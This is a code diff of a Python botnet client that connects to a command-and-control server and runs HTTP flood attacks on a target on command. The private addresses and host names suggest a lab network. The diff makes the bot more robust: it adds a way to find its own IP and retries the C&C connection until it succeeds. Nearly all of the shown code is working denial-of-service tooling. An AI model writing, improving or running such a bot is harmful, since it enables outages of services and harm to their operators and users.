@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # Bot script - runs on ws2 and ws3
 # Connects to C&C server and waits for attack command
-# Usage: python3 bot.py
+
 
 import socket
 import threading
@@ -9,6 +9,17 @@ import time
 
 CNC_IP = "10.2.0.2"
 CNC_PORT = 9999
+
+def get_my_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except:
+        ip = "127.0.0.1"
+    finally:
+        s.close()
+    return ip
 
 def http_flood(target_ip, target_port, stop_event, bot_id):
     print(f"[BOT-{bot_id}] Starting HTTP flood on {target_ip}:{target_port}")
@@ -30,16 +41,21 @@ def http_flood(target_ip, target_port, stop_event, bot_id):
                 print(f"[BOT-{bot_id}] [FAIL] {failed} requests failed (server overwhelmed!)")
 
 def main():
-    # get bot id from ip
-    my_ip = socket.gethostbyname(socket.gethostname())
+    my_ip = get_my_ip()
     bot_id = my_ip.split(".")[-1]
 
     print(f"[BOT-{bot_id}] Starting up...")
     print(f"[BOT-{bot_id}] Connecting to C&C at {CNC_IP}:{CNC_PORT}")
 
-    cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    cnc.connect((CNC_IP, CNC_PORT))
-    print(f"[BOT-{bot_id}] [OK] Connected to C&C! Waiting for commands...")
+    while True:
+        try:
+            cnc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            cnc.connect((CNC_IP, CNC_PORT))
+            print(f"[BOT-{bot_id}] [OK] Connected to C&C! Waiting for commands...")
+            break
+        except:
+            print(f"[BOT-{bot_id}] C&C not ready, retrying in 2s...")
+            time.sleep(2)
 
     stop_event = threading.Event()
     attack_thread = None
